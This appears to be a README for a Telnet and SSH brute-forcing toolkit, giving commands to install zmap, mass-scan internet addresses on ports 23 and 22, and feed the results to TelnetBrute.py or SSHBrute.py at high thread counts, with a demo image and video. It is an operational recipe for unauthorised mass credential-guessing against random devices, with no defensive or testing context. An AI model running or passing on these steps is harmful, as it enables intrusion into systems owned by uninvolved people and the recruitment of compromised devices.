[VPS CentOS 6.9/6.8] (Recomendado)

- Install zmap

1- sh CentOS_zmap_auto_install.sh OR Debian_zmap_auto_install.sh

- Scan Telnet/Ssh Ips

1- ulimit -n 999999

2- zmap -p23 -o mfutelnet.txt -N 250000    ---OR---    zmap -p22 -o mfussh.txt -N 250000

   1,5-(optional)  zmap -p23 -o mfutelnet.txt -w telnet.lst   ---OR---   zmap -p22 -o mfussh.txt -w ssh.lst

- Bruteforce 

2- ulimit -n 999999

3- python TelnetBrute.py mfutelnet.txt 15000 telnettest.txt    ---OR---    python SSHBrute.py mfussh.txt 15000 sshtest.txt 




<img src="https://raw.githubusercontent.com/XeljomudoX/TelnetBrute.py/master/lul.png">



Video:

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZOCRpKSFLfs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
